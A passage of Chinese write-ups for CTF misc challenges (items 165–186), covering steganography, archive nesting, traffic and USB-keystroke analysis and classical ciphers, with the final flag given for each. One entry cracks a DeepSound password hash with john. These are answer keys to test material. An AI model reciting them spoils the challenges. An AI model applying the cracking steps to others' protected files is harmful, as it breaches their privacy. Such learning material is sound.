(36, &#x27;m&#x27;),     (37, &#x27;m&#x27;), (38, &#x27;m&#x27;), (39, &#x27;m&#x27;), (40, &#x27;m&#x27;), (41, &#x27;m&#x27;), (46, &#x27;m&#x27;), (47, &#x27;m&#x27;), (52, &#x27;m&#x27;), (53, &#x27;m&#x27;), (54, &#x27;m&#x27;),     (65, &#x27;m&#x27;), (66, &#x27;m&#x27;), (67, &#x27;m&#x27;), (68, &#x27;m&#x27;), (71, &#x27;m&#x27;), (72, &#x27;m&#x27;), (73, &#x27;m&#x27;), (74, &#x27;m&#x27;), (75, &#x27;m&#x27;), (76, &#x27;m&#x27;)],    [(2, &#x27;m&#x27;), (3, &#x27;m&#x27;), (4, &#x27;m&#x27;), (9, &#x27;m&#x27;), (10, &#x27;m&#x27;), (11, &#x27;m&#x27;), (12, &#x27;#&#x27;), (15, &#x27;m&#x27;), (16, &#x27;m&#x27;), (17, &#x27;#&#x27;),     (18, &#x27;m&#x27;), (19, &#x27;m&#x27;), (22, &#x27;&quot;&#x27;), (26, &#x27;&quot;&#x27;), (27, &#x27;#&#x27;), (30, &#x27;m&#x27;), (31, &#x27;m&#x27;), (32, &#x27;m&#x27;), (33, &#x27;#&#x27;), (40, &#x27;#&#x27;),     (41, &#x27;&quot;&#x27;), (45, &#x27;m&#x27;), (46, &#x27;&quot;&#x27;), (47, &#x27;#&#x27;), (50, &#x27;m&#x27;), (51, &#x27;&quot;&#x27;), (55, &#x27;&quot;&#x27;), (58, &#x27;m&#x27;), (59, &#x27;m&#x27;), (60, &#x27;m&#x27;),     (64, &#x27;#&#x27;), (65, &#x27;&quot;&#x27;), (68, &#x27;&quot;&#x27;), (69, &#x27;m&#x27;), (75, &#x27;#&#x27;), (76, &#x27;&quot;&#x27;)],    [(1, &#x27;#&#x27;), (2, &#x27;&quot;&#x27;), (5, &#x27;#&#x27;), (8, &#x27;#&#x27;), (9, &#x27;&quot;&#x27;), (11, &#x27;&quot;&#x27;), (12, &#x27;#&#x27;), (17, &#x27;#&#x27;), (24, &#x27;m&#x27;), (25, &#x27;m&#x27;), (26, &#x27;m&#x27;),     (27, &#x27;&quot;&#x27;), (29, &#x27;#&#x27;), (30, &#x27;&quot;&#x27;), (32, &#x27;&quot;&#x27;), (33, &#x27;#&#x27;), (39, &#x27;m&#x27;), (40, &#x27;&quot;&#x27;), (44, &#x27;#&#x27;), (45, &#x27;&quot;&#x27;), (47, &#x27;#&#x27;),     (50, &#x27;#&#x27;), (51, &#x27;m&#x27;), (52, &#x27;&quot;&#x27;), (53, &#x27;&quot;&#x27;), (54, &#x27;#&#x27;), (55, &#x27;m&#x27;), (57, &#x27;#&#x27;), (58, &#x27;&quot;&#x27;), (61, &#x27;#&#x27;), (64, &#x27;#&#x27;),     (65, &#x27;m&#x27;), (68, &#x27;m&#x27;), (69, &#x27;#&#x27;), (74, &#x27;m&#x27;), (75, &#x27;&quot;&#x27;)],    [(1, &#x27;#&#x27;), (2, &#x27;&quot;&#x27;), (3, &#x27;&quot;&#x27;), (4, &#x27;&quot;&#x27;), (5, &#x27;&quot;&#x27;), (8, &#x27;#&#x27;), (12, &#x27;#&#x27;), (17, &#x27;#&#x27;), (26, &#x27;&quot;&#x27;), (27, &#x27;#&#x27;), (29, &#x27;#&#x27;),     (33, &#x27;#&#x27;), (38, &#x27;m&#x27;), (39, &#x27;&quot;&#x27;), (43, &#x27;#&#x27;), (44, &#x27;m&#x27;), (45, &#x27;m&#x27;), (46, &#x27;m&#x27;), (47, &#x27;#&#x27;), (48, &#x27;m&#x27;), (50, &#x27;#&#x27;),     (55, &#x27;#&#x27;), (57, &#x27;#&#x27;), (58, &#x27;&quot;&#x27;), (59, &#x27;&quot;&#x27;), (60, &#x27;&quot;&#x27;), (61, &#x27;&quot;&#x27;), (65, &#x27;&quot;&#x27;), (66, &#x27;&quot;&#x27;), (67, &#x27;&quot;&#x27;), (69, &#x27;#&#x27;),     (73, &#x27;m&#x27;), (74, &#x27;&quot;&#x27;)],    [(1, &#x27;&quot;&#x27;), (2, &#x27;#&#x27;), (3, &#x27;m&#x27;), (4, &#x27;m&#x27;), (5, &#x27;&quot;&#x27;), (8, &#x27;&quot;&#x27;), (9, &#x27;#&#x27;), (10, &#x27;m&#x27;), (11, &#x27;#&#x27;), (12, &#x27;#&#x27;), (17, &#x27;#&#x27;),     (22, &#x27;&quot;&#x27;), (23, &#x27;m&#x27;), (24, &#x27;m&#x27;), (25, &#x27;m&#x27;), (26, &#x27;#&#x27;), (27, &#x27;&quot;&#x27;), (29, &#x27;&quot;&#x27;), (30, &#x27;#&#x27;), (31, &#x27;m&#x27;), (32, &#x27;#&#x27;),     (33, &#x27;#&#x27;), (37, &#x27;m&#x27;), (38, &#x27;&quot;&#x27;), (47, &#x27;#&#x27;), (51, &#x27;#&#x27;), (52, &#x27;m&#x27;), (53, &#x27;m&#x27;), (54, &#x27;#&#x27;), (55, &#x27;&quot;&#x27;), (57, &#x27;&quot;&#x27;),     (58, &#x27;#&#x27;), (59, &#x27;m&#x27;), (60, &#x27;m&#x27;), (61, &#x27;&quot;&#x27;), (64, &#x27;&quot;&#x27;), (65, &#x27;m&#x27;), (66, &#x27;m&#x27;), (67, &#x27;m&#x27;), (68, &#x27;&quot;&#x27;), (72, &#x27;m&#x27;),     (73, &#x27;&quot;&#x27;)], [], [], [],    [(5, &#x27;#&#x27;), (8, &#x27;#&#x27;), (16, &#x27;m&#x27;), (17, &#x27;m&#x27;), (18, &#x27;m&#x27;), (19, &#x27;m&#x27;), (23, &#x27;m&#x27;), (24, &#x27;m&#x27;), (25, &#x27;m&#x27;), (26, &#x27;m&#x27;),     (30, &#x27;m&#x27;), (31, &#x27;m&#x27;), (32, &#x27;m&#x27;), (33, &#x27;m&#x27;), (38, &#x27;m&#x27;), (39, &#x27;m&#x27;), (40, &#x27;m&#x27;), (50, &#x27;#&#x27;), (57, &#x27;#&#x27;), (64, &#x27;#&#x27;),     (71, &#x27;m&#x27;), (72, &#x27;m&#x27;), (73, &#x27;m&#x27;)],    [(2, &#x27;m&#x27;), (3, &#x27;m&#x27;), (4, &#x27;m&#x27;), (5, &#x27;#&#x27;), (8, &#x27;#&#x27;), (9, &#x27;m&#x27;), (10, &#x27;m&#x27;), (11, &#x27;m&#x27;), (15, &#x27;#&#x27;), (16, &#x27;&quot;&#x27;), (19, &#x27;&quot;&#x27;),     (20, &#x27;m&#x27;), (22, &#x27;m&#x27;), (23, &#x27;&quot;&#x27;), (26, &#x27;&quot;&#x27;), (27, &#x27;m&#x27;), (29, &#x27;#&#x27;), (34, &#x27;#&#x27;), (36, &#x27;m&#x27;), (37, &#x27;&quot;&#x27;), (41, &#x27;&quot;&#x27;),     (44, &#x27;m&#x27;), (45, &#x27;m&#x27;), (46, &#x27;m&#x27;), (50, &#x27;#&#x27;), (51, &#x27;m&#x27;), (52, &#x27;m&#x27;), (53, &#x27;m&#x27;), (57, &#x27;#&#x27;), (58, &#x27;m&#x27;), (59, &#x27;m&#x27;),     (60, &#x27;m&#x27;), (64, &#x27;#&#x27;), (65, &#x27;m&#x27;), (66, &#x27;m&#x27;), (67, &#x27;m&#x27;), (73, &#x27;#&#x27;)],    [(1, &#x27;#&#x27;), (2, &#x27;&quot;&#x27;), (4, &#x27;&quot;&#x27;), (5, &#x27;#&#x27;), (8, &#x27;#&#x27;), (9, &#x27;&quot;&#x27;), (11, &#x27;&quot;&#x27;), (12, &#x27;#&#x27;), (15, &#x27;#&#x27;), (16, &#x27;m&#x27;), (19, &#x27;m&#x27;),     (20, &#x27;#&#x27;), (22, &#x27;#&#x27;), (25, &#x27;m&#x27;), (27, &#x27;#&#x27;), (29, &#x27;&quot;&#x27;), (30, &#x27;m&#x27;), (31, &#x27;m&#x27;), (32, &#x27;m&#x27;), (33, &#x27;m&#x27;), (34, &#x27;&quot;&#x27;),     (36, &#x27;#&#x27;), (37, &#x27;m&#x27;), (38, &#x27;&quot;&#x27;), (39, &#x27;&quot;&#x27;), (40, &#x27;#&#x27;), (41, &#x27;m&#x27;), (43, &#x27;#&#x27;), (44, &#x27;&quot;&#x27;), (47, &#x27;#&#x27;), (50, &#x27;#&#x27;),     (51, &#x27;&quot;&#x27;), (53, &#x27;&quot;&#x27;), (54, &#x27;#&#x27;), (57, &#x27;#&#x27;), (58, &#x27;&quot;&#x27;), (60, &#x27;&quot;&#x27;), (61, &#x27;#&#x27;), (64, &#x27;#&#x27;), (65, &#x27;&quot;&#x27;), (67, &#x27;&quot;&#x27;),     (68, &#x27;#&#x27;), (73, &#x27;#&#x27;)],    [(1, &#x27;#&#x27;), (5, &#x27;#&#x27;), (8, &#x27;#&#x27;), (12, &#x27;#&#x27;), (16, &#x27;&quot;&#x27;), (17, &#x27;&quot;&#x27;), (18, &#x27;&quot;&#x27;), (20, &#x27;#&#x27;), (22, &#x27;#&#x27;), (27, &#x27;#&#x27;),     (29, &#x27;#&#x27;), (33, &#x27;&quot;&#x27;), (34, &#x27;#&#x27;), (36, &#x27;#&#x27;), (41, &#x27;#&#x27;), (43, &#x27;#&#x27;), (44, &#x27;&quot;&#x27;), (45, &#x27;&quot;&#x27;), (46, &#x27;&quot;&#x27;), (47, &#x27;&quot;&#x27;),     (50, &#x27;#&#x27;), (54, &#x27;#&#x27;), (57, &#x27;#&#x27;), (61, &#x27;#&#x27;), (64, &#x27;#&#x27;), (68, &#x27;#&#x27;), (73, &#x27;#&#x27;)],    [(1, &#x27;&quot;&#x27;), (2, &#x27;#&#x27;), (3, &#x27;m&#x27;), (4, &#x27;#&#x27;), (5, &#x27;#&#x27;), (8, &#x27;#&#x27;), (9, &#x27;#&#x27;), (10, &#x27;m&#x27;), (11, &#x27;#&#x27;), (12, &#x27;&quot;&#x27;), (15, &#x27;&quot;&#x27;),     (16, &#x27;m&#x27;), (17, &#x27;m&#x27;), (18, &#x27;m&#x27;), (19, &#x27;&quot;&#x27;), (23, &#x27;#&#x27;), (24, &#x27;m&#x27;), (25, &#x27;m&#x27;), (26, &#x27;#&#x27;), (29, &#x27;&quot;&#x27;), (30, &#x27;#&#x27;),     (31, &#x27;m&#x27;), (32, &#x27;m&#x27;), (33, &#x27;m&#x27;), (34, &#x27;&quot;&#x27;), (37, &#x27;#&#x27;), (38, &#x27;m&#x27;), (39, &#x27;m&#x27;), (40, &#x27;#&#x27;), (41, &#x27;&quot;&#x27;), (43, &#x27;&quot;&#x27;),     (44, &#x27;#&#x27;), (45, &#x27;m&#x27;), (46, &#x27;m&#x27;), (47, &#x27;&quot;&#x27;), (50, &#x27;#&#x27;), (51, &#x27;#&#x27;), (52, &#x27;m&#x27;), (53, &#x27;#&#x27;), (54, &#x27;&quot;&#x27;), (57, &#x27;#&#x27;),     (58, &#x27;#&#x27;), (59, &#x27;m&#x27;), (60, &#x27;#&#x27;), (61, &#x27;&quot;&#x27;), (64, &#x27;#&#x27;), (65, &#x27;#&#x27;), (66, &#x27;m&#x27;), (67, &#x27;#&#x27;), (68, &#x27;&quot;&#x27;), (71, &#x27;m&#x27;),     (72, &#x27;m&#x27;), (73, &#x27;#&#x27;), (74, &#x27;m&#x27;), (75, &#x27;m&#x27;)], [], [], [],    [(2, &#x27;m&#x27;), (3, &#x27;m&#x27;), (4, &#x27;m&#x27;), (5, &#x27;m&#x27;), (8, &#x27;m&#x27;), (9, &#x27;m&#x27;), (10, &#x27;m&#x27;), (11, &#x27;m&#x27;), (12, &#x27;m&#x27;), (19, &#x27;#&#x27;), (24, &#x27;m&#x27;),     (25, &#x27;m&#x27;), (26, &#x27;m&#x27;), (29, &#x27;&quot;&#x27;), (30, &#x27;&quot;&#x27;), (31, &#x27;m&#x27;)],    [(1, &#x27;#&#x27;), (2, &#x27;&quot;&#x27;), (5, &#x27;&quot;&#x27;), (6, &#x27;m&#x27;), (8, &#x27;#&#x27;), (16, &#x27;m&#x27;), (17, &#x27;m&#x27;), (18, &#x27;m&#x27;), (19, &#x27;#&#x27;), (22, &#x27;m&#x27;), (23, &#x27;&quot;&#x27;),     (27, &#x27;&quot;&#x27;), (31, &#x27;#&#x27;)],    [(1, &#x27;#&#x27;), (2, &#x27;m&#x27;), (5, &#x27;m&#x27;), (6, &#x27;#&#x27;), (8, &#x27;&quot;&#x27;), (9, &#x27;&quot;&#x27;), (10, &#x27;&quot;&#x27;), (11, &#x27;&quot;&#x27;), (12, &#x27;m&#x27;), (13, &#x27;m&#x27;), (15, &#x27;#&#x27;),     (16, &#x27;&quot;&#x27;), (18, &#x27;&quot;&#x27;), (19, &#x27;#&#x27;), (22, &#x27;#&#x27;), (23, &#x27;m&#x27;), (24, &#x27;&quot;&#x27;), (25, &#x27;&quot;&#x27;), (26, &#x27;#&#x27;), (27, &#x27;m&#x27;), (31, &#x27;&quot;&#x27;),     (32, &#x27;m&#x27;), (33, &#x27;m&#x27;)],    [(2, &#x27;&quot;&#x27;), (3, &#x27;&quot;&#x27;), (4, &#x27;&quot;&#x27;), (6, &#x27;#&#x27;), (13, &#x27;#&#x27;), (15, &#x27;#&#x27;), (19, &#x27;#&#x27;), (22, &#x27;#&#x27;), (27, &#x27;#&#x27;), (31, &#x27;#&#x27;)],    [(1, &#x27;&quot;&#x27;), (2, &#x27;m&#x27;), (3, &#x27;m&#x27;), (4, &#x27;m&#x27;), (5, &#x27;&quot;&#x27;), (8, &#x27;&quot;&#x27;), (9, &#x27;m&#x27;), (10, &#x27;m&#x27;), (11, &#x27;m&#x27;), (12, &#x27;#&#x27;), (13, &#x27;&quot;&#x27;),     (15, &#x27;&quot;&#x27;), (16, &#x27;#&#x27;), (17, &#x27;m&#x27;), (18, &#x27;#&#x27;), (19, &#x27;#&#x27;), (23, &#x27;#&#x27;), (24, &#x27;m&#x27;), (25, &#x27;m&#x27;), (26, &#x27;#&#x27;), (27, &#x27;&quot;&#x27;),     (31, &#x27;#&#x27;)], [(29, &#x27;&quot;&#x27;), (30, &#x27;&quot;&#x27;)]]temp = [&#x27; &#x27;] * 76for line, data in enumerate(flag):    if not data:        print()    else:        for t in data:            try:                temp[t[0]] = t[1]            except Exception:                pass    print(&#x27;&#x27;.join(temp))    temp = [&#x27; &#x27;] * 76

然后就出了


flag：flag{a273fdedf3d746e97db9086ebbb195d6}
165.Beautiful_Sideforemost分离出半张二维码


二维码手动补全网站： QRazyBox - QR Code Analysis and Recovery Toolkit
我自己手动补了一下：


然后点tools / extract qr information
看到flag：


flag：flag{OQWIC_4DS1A_S034S}
166.[INSHack2018]42.tar.xz压缩包套娃
网上看到个bash脚本：
while [ &quot;`find . -type f -name &#x27;*.tar.xz&#x27; | wc -l`&quot; -gt 0 ]; do find -type f -name &quot;*.tar.xz&quot; -exec tar xf &#x27;&#123;&#125;&#x27; \; -exec rm -- &#x27;&#123;&#125;&#x27; \;; done;

直接就出了


flag：flag{04ebb0d6a87f9771f2eea4dce5b91a85e7623c13301a8007914085a91b3ca6d9}
167.[BSidesSF2019]diskimage一张上半部分是花的图片，zsteg跑一下


有一个DOS&#x2F;MBR，是磁盘数据
提取一下
zsteg -e &#x27;b8,rgb,lsb,xy&#x27; 1111.png &gt; disk

然后使用testdisk（kali自带）
testdisk disk

procced回车
None回车
undeleted回车
往下滑看到一个红色的_LAG.ICO
选中它，按c即可复制
然后就能在文件里面看到它了


flag：flag{FAT12_FTW}
168.[INSHack2017]remote-multimedia-controller
# 远程多媒体控制器
Caasi Vosima昨晚组织了一个派对，向他展示新的高科技房屋朋友们，但多媒体播放器出了点问题，音乐是关闭。
重新启动音乐播放器需要一些时间，派对就像冻结了一样时刻。Caasi 能够恢复之前收集的一些信息崩溃。
帮助卡西找出发生了什么

md里面文件
流量。
分组字节流搜索flag


看到一个flag.txt
追踪tcp流量发现一段base
Vmxkd1NrNVhVbk5qUlZKU1ltdGFjRlJYZEhOaWJFNVhWR3RPV0dKVmJEWldiR1JyV1ZkS1ZXRXphRnBpVkVaVFYycEtVMU5IUmtobFJYQlRUVmhDTmxZeFdtdGhhelZ5WWtWYWFWSlViRmRVVlZaYVRURmFjbFpyT1ZaV2JXUTJWa1pvYTFkck1YVlVhbHBoVWxack1GUlZaRXRqVmxaMVZHMTRXRkpVUlRCWFdIQkdUbGRHY2s1VmFFOVdNWEJoV1Zkek1XSldaSFJPVm1SclZsZDRXbFJWVm5wUVVUMDk=

basecrack秒了：Good job ! You found the flag: INSA{TCP_s0ck3t_4n4lys1s_c4n_b3_fun!}
flag：flag{TCP_s0ck3t_4n4lys1s_c4n_b3_fun!}
169.[INSHack2017]hiding-in-plain-sightforemost分离chall.png
就出了


flag：flag{l337_h4xx0r5_c0mmun1c473_w17h_PNGs}
170.[WMCTF2020]行为艺术一张图片和一个txt，图片拖进随波逐流爆宽高
得到全部的图片


hint提示我们zip结构，我们手打一下这些数字
504B0304140000000800DB93C55086A39007D8000000DF01000008000000666C61672E74787475504B0E823010DD93708771DDCCB0270D5BBD0371815A9148AC6951C2ED9D271F89C62E2693D7F76BB7DE9FC80D2E6E68E782A326D2E01F81CE6D55E76972E9BA7BCCB3ACEF7B89F7B6E90EA16A6EE2439D45179ECDD1C5CCFB6B9AA489C1218C92B898779D765FCCBB58CC920B6662C5F91749931132258F32BBA7C288C5AE103133106608409DAC419F77241A3412907814AB7A922106B8DED0D25AEC8A634929025C46A33FE5A1D3167A100323B1ABEE4A7A0708413A19E17718165F5D3E73D577798E36D5144B66315AAE315078F5E51A29246AF402504B01021F00140009000800DB93C55086A39007D8000000DF010000080024000000000000002000000000000000666C61672E7478740A00200000000000010018004A0A9A64243BD601F9D8AB39243BD6012D00CA13223BD601504B050600000000010001005A000000FE00000000000000

010保存为
有密码，是伪密码，看到
Good eyes! Here is your flag:https://www.splitbrain.org/services/ook+++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- .&lt;+++ [-&gt;-- -&lt;]&gt;-.&lt;+++ +[-&gt;+ +++&lt;] &gt;+.&lt;+ ++[-&gt; ---&lt;] &gt;---- -.&lt;++ +++++ [-&gt;++ +++++ &lt;]&gt;++++.-- --.&lt;+ +++[- &gt;---- &lt;]&gt;-- ----. +++++ +++.&lt; +++[- &gt;---&lt; ]&gt;-.+ ++.+++++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- .+++. -.... --.++ +.&lt;++ +[-&gt;+ ++&lt;]&gt; ++++. &lt;++++++++[ -&gt;--- ----- &lt;]&gt;-- ----- ----- --.&lt;+ +++[- &gt;++++ &lt;]&gt;+. +...&lt; ++++++++[- &gt;++++ ++++&lt; ]&gt;+++ +++++ +++.. .-.&lt;

ook编码，解密得到flag，WMCTF{wai_bi_baaaa_bo!2333~~~}
flag：flag{wai_bi_baaaa_bo!2333~~~}
171.[XMAN2018排位赛]AutoKey应该就是autokey了
跑一遍usbkeyboarddatahacker


得到
&#x27;&lt;CAP&gt;mplrvffczeyoujfjkybxgzvdgqaurkxzolkolvtufblrnjesqitwahxnsijxpnmplshcjbtyhzealogviaaissplfhlfswfehjncrwhtinsmambvexo&lt;DEL&gt;pze&lt;DEL&gt;iz&#x27;

去掉“CAP、DEL”，得到autokey密文
注意DEL前面的字符也要删除
mplrvffczeyoujfjkybxgzvdgqaurkxzolkolvtufblrnjesqitwahxnsijxpnmplshcjbtyhzealogviaaissplfhlfswfehjncrwhtinsmambvexpziz

然后使用autokey来破解： hotzzzzy&#x2F;breakautokey: breakautokey
这个要python2环境


注意这里如果用随波逐流的zutokey解密的话要密钥：FLAGHERE
flag：flag{JHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF}
172. [INSHack2018] (not) so deep音频文件，频谱图发现前半段flag


拖进deepsound发现要密码
利用deepsounds2john.py
python .\deepsounds2john.py .\final_flag.wav

得到
final_flag.wav:$dynamic_1529$b8f858d9deb0b805797cef03299e3bdd8990f48a
得到了哈希值后利用john破解
john hash.txt

爆破出密码：
azerty

deepsound解密，得到flag2.txt
0_1s_4lwayS_Th3_S4me&#125;

flag：flag{Aud1o_st3G4n0_1s_4lwayS_Th3_S4me}
173.[QCTF2018]X-man-Keyword应该是跟lsb有关的，zsteg，stegsolve都不出，用cloacked-pixel
python2 lsb.py extract 122.png result.txt lovekfc

看到


这道题有个提示是将lovekfc从26个英文字母里面提到前面来作为密钥
然后密钥就是lovekfcabdghijmnpqrstuwxyz
随波逐流选择简单换位SimpleSubsitution解密
就出了QCTF{CCGELDNRIBCXGGKFFELNSNMRDOWF}（注意这里于原本的那个密码对应大小写）
flag：flag{cCgeLdnrIBCX9G1g13KFfeLNsnMRdOwf}
174.[DASCTF X BUUOJ 五月大联动]签到直接送了
flag：flag{welcome_to_dasctf_may}
175.[INSHack2017]10-cl0v3rf13ld-lane-signal010发现是jpg文件，改后缀
010还发现了一个png文件和一个ogg文件
foremost可以提出这个png文件，是一张morse对照表
提出这个ogg文件，保存后缀为ogg，拖进aud


手敲morse就行
.. -. ... .- -.--. -- ----- .-. ..... ...-- ..--.- .-- .---- .-.. .-.. ..--.- -. ...-- ...- ...-- .-. ..--.- ....- --. ...-- -.-.-- -.--.-

flag：flag{M0R53_W1LL_N3V3R_4G3!}
176.一路到底打开发现一万个txt，拉到最底部，发现有个start.txt
20555 : The next is a8242a234560a0d3cf121864ee34d7fb.txt

提示着我们下一个
772 : The next is 5d2ecc80d506dc00c6457a2cb6430d54.txt

而且我们需要注意到
20555-&gt;50 4B
772-&gt;03 04
转化16进制暗示我们提取zip
脚本破解
# python3.10import binasciipath = &quot;files/&quot;hex_data = &#x27;&#x27;next_file = &#x27;start.txt&#x27;while True:    filename = &#x27;&#x27;.join([path, next_file])    try:        with open(filename, &#x27;r&#x27;) as f:            line = f.read()            idx = line.index(&#x27;:&#x27;)            dec_data = int(line[:idx - 1])            hex_data += f&#x27;&#123;dec_data:04x&#125;&#x27;            next_file = line[-36:]    except:        breakzipfile = path + &#x27;flag.zip&#x27;with open(zipfile, &#x27;wb&#x27;) as ff:    ff.write(binascii.unhexlify(hex_data))

zip注释里面写着：年轻人，能走到这一步不容易啊！不要灰心，密码十分钟就可以破解哦，加油！
暗示我们暴力破解压缩包，直接arp
密码：tgb678
打开image.png，010发现其实是jpg格式，改文件头改后缀看到flag
flag：flag{0c6b489ca956e2fd94dce12be4bf0729}
177.[DASCTF 2023 &amp; 0X401七月暑期挑战赛]签到题签到题，点击就送
flag：flag{DASCTF7_0x401_Happy}
178.[MRCTF2020]寻找xxx可以aud手敲，也可以在线网站： Detect DTMF Tones


结果是18684221609
wp说还要加战队公众号才能得到flag
这里直接拿了
flag：flag{Oh!!!!!_Y0u_f1nd_my_secret}
179.[DASCTF X CBCTF 2023｜无畏者先行]签到点击就送
flag：DASCTF{welcome_to_cbctf_2023}
（666又是搞特殊的题目）
180.[羊城杯 2020]signin是一个signin.txt
BCEHACEIBDEIBDEHBDEHADEIACEGACFIBDFHACEGBCEHBCFIBDEGBDEGADFGBDEHBDEGBDFHBCEGACFIBCFGADEIADEIADFH

ToyCipher 密码
对照表： 301.pdf
脚本：
cipherdic = &#123;&#x27;M&#x27;:&#x27;ACEG&#x27;,&#x27;R&#x27;:&#x27;ADEG&#x27;,&#x27;K&#x27;:&#x27;BCEG&#x27;,&#x27;S&#x27;:&#x27;BDEG&#x27;,&#x27;A&#x27;:&#x27;ACEH&#x27;,&#x27;B&#x27;:&#x27;ADEH&#x27;,&#x27;L&#x27;:&#x27;BCEH&#x27;,&#x27;U&#x27;:&#x27;BDEH&#x27;,&#x27;D&#x27;:&#x27;ACEI&#x27;,&#x27;C&#x27;:&#x27;ADEI&#x27;,&#x27;N&#x27;:&#x27;BCEI&#x27;,&#x27;V&#x27;:&#x27;BDEI&#x27;,&#x27;H&#x27;:&#x27;ACFG&#x27;,&#x27;F&#x27;:&#x27;ADFG&#x27;,&#x27;O&#x27;:&#x27;BCFG&#x27;,&#x27;W&#x27;:&#x27;BDFG&#x27;,&#x27;T&#x27;:&#x27;ACFH&#x27;,&#x27;G&#x27;:&#x27;ADFH&#x27;,&#x27;P&#x27;:&#x27;BCFH&#x27;,&#x27;X&#x27;:&#x27;BDFH&#x27;,&#x27;E&#x27;:&#x27;ACFI&#x27;,&#x27;I&#x27;:&#x27;ADFI&#x27;,&#x27;Q&#x27;:&#x27;BCFI&#x27;,&#x27;Y&#x27;:&#x27;BDFI&#x27;&#125;ciphertext = &#x27;&#x27;with open(&#x27;signin.txt&#x27;,&#x27;r&#x27;) as f:    f = f.read()    for i in range(0,len(f),4):        block = f[i:i+4]        for j in cipherdic:            if block == cipherdic[j]:                ciphertext += j                #print(&#x27;&#123;&#125;: &#123;&#125;&#x27;.format(block,j))print(ciphertext)

得到
LDVUUCMEXMLQSSFUSXKEOCCG

提示我们需要将第二张表倒序排列，再对比一次
脚本2：
ciphertext = &#x27;LDVUUCMEXMLQSSFUSXKEOCCG&#x27;original_list = [&#x27;M&#x27;,&#x27;R&#x27;,&#x27;K&#x27;,&#x27;S&#x27;,&#x27;A&#x27;,&#x27;B&#x27;,&#x27;L&#x27;,&#x27;U&#x27;,&#x27;D&#x27;,&#x27;C&#x27;,&#x27;N&#x27;,&#x27;V&#x27;,&#x27;H&#x27;,&#x27;F&#x27;,&#x27;O&#x27;,&#x27;W&#x27;,&#x27;T&#x27;,&#x27;G&#x27;,&#x27;P&#x27;,&#x27;X&#x27;,&#x27;E&#x27;,&#x27;I&#x27;,&#x27;Q&#x27;,&#x27;Y&#x27;]reversed_list = original_list[::-1]flag = &#x27;&#x27;for char in ciphertext:    for olist in original_list:        if char == olist:            oindex = original_list.index(olist)            flag += reversed_list[oindex]flag = flag.replace(&#x27;GWHT&#x27;,&#x27;GWHT&#123;&#x27;)flag = flag.replace(&#x27;COOL&#x27;,&#x27;COOL&#125;&#x27;)print(flag)

就得到了GWHT{TOYSAYGREENTEAISCOOL}
flag：flag{TOYSAYGREENTEAISCOOL}
181.[HDCTF2019]信号分析PT2242信号：前面4bit表示同步码，中间的20bit表示地址码，后面的4bit表示功能码，最后一位是停止码
这个是PT2242信号，我们aud打开把长的当成1，短的当成0，再细看会发现所有段的信号都是一样的，所以我们只要分析一个就行了


得到0101010101010101000000110
这次只有25位，划分一下就是0101010101010101 00000011 0并且这里是两位当做一位，然后 01 代表 F，00 代表 0,11 代表 1，最后的0是结束符
flag：flag{FFFFFFFF0001}
182.[SUCTF2018]dead_z3r0这个文件010打开看到前面部分是一段类似base64的东西，后面则是一段pyc文件
把从33 0D 0D 0A开始保存一个pyc文件
再使用在线网站反编译pyc得到
#!/usr/bin/env python# visit https://tool.lu/pyc/ for more information# Version: Python 3.6def encryt(key, plain):    cipher = &#x27;&#x27;    for i in range(len(plain)):        cipher += chr(ord(key[i % len(key)]) ^ ord(plain[i]))        return cipherdef getPlainText():    plain = &#x27;&#x27;    with open(&#x27;plain.txt&#x27;) as f:        while None:            line = f.readline()            if line:                plain += line                continue            break    return plaindef main():    key = &#x27;LordCasser&#x27;    plain = getPlainText()    cipher = encryt(key, plain)    with open(&#x27;cipher.txt&#x27;, &#x27;w&#x27;) as f:        f.write(cipher.encode(&#x27;base_64&#x27;))if __name__ == &#x27;__main__&#x27;:    main()

尝试剑龙隐写，注意这里python版本是3.6（要切换）
就出了


flag：flag{Z3r0_fin411y_d34d}
183.[羊城杯 2020]TCP_IP这个是IP数据报隐写
wireshark打开发现里面是一段对话，我们再看这个
他将隐写的内容藏进了Identification字段里面去




tshark提取出来
tshark -r .\attachment.pcap -T fields -e ip.id &gt; data.txt

提取在了data.txt里面
随波逐流转ascii码
@iH&lt;,&#123;*;oUp/im&quot;QPl`yR*ie&#125;NK;.D!Xu)b:J[Rj+6KKM7P@iH&lt;,&#123;*;oUp/im&quot;QPl`yR

这是base91
解码脚本：
import base64import reimport base91def baseDec(text,type):    if type == 1:        return base64.b16decode(text)    elif type == 2:        return base64.b32decode(text)    elif type == 3:        return base64.b64decode(text)    elif type == 4:        return base64.b85decode(text)    elif type == 5:        return base91.decode(text.decode())    else:        passdef detect(text):    try:        if re.match(&quot;^[0-9A-F=]+$&quot;,text.decode()) is not None:            return 1    except:        pass        try:        if re.match(&quot;^[A-Z2-7=]+$&quot;,text.decode()) is not None:            return 2    except:        pass    try:        if re.match(&quot;^[A-Za-z0-9+/=]+$&quot;,text.decode()) is not None:            return 3    except:        pass    try:        if re.match(&quot;^[A-Za-z0-9$%()*+,-./:;?@[\]^_`&#123;|&#125;~]+$&quot;,text.decode()) is not None:            return 4    except:        pass    try:        if re.match(&quot;^[^-\&#x27;]+$&quot;,text.decode()) is not None:            return 5    except:        pass        return 5def autoDec(text):    floor = 0    while True:        try:            code = detect(text)            text = baseDec(text,code)            floor += 1            print(&quot;第&#123;0&#125;层：\n&quot;.format(floor),text)            if not text:break        except:            breakif __name__ == &quot;__main__&quot;:    # with open(&quot;Autopy/crypto/doc/form&quot;,&#x27;rb&#x27;) as f:    #     content = f.read()    content = &quot;@iH&lt;,&#123;*;oUp/im\&quot;QPl`yR*ie&#125;NK;.D!Xu)b:J[Rj+6KKM7P@iH&lt;,&#123;*;oUp/im\&quot;QPl`yR&quot;.encode()    autoDec(content)

flag：flag{wMt84iS06mCbbfuOfuVXCZ8MSsAFN1GA}
184.[DASCTF 2023六月挑战赛｜二进制专项]签到点击就送
flag：flag{Welcome_to_DASCTF5}
185.[watevrCTF 2019]Unspaellablle词频分析无结果，找到原文来对比一下有什么删改的字
Children Of The Gods Transcript at IMSDb.
vimdiff 1.txt 2.txt

看到变红的字就是删减的字样
最后得到watevr{icantspeel_tiny.cc&#x2F;2qtdez}
flag：flag{icantspeel_tiny.cc&#x2F;2qtdez}
186.[BSidesSF2019]thekeyusb流量，分析一下
usbkeybroaddatahacker一下


看到了ctf{MY_FAVOURITE_EDITOR_IS_VIM}
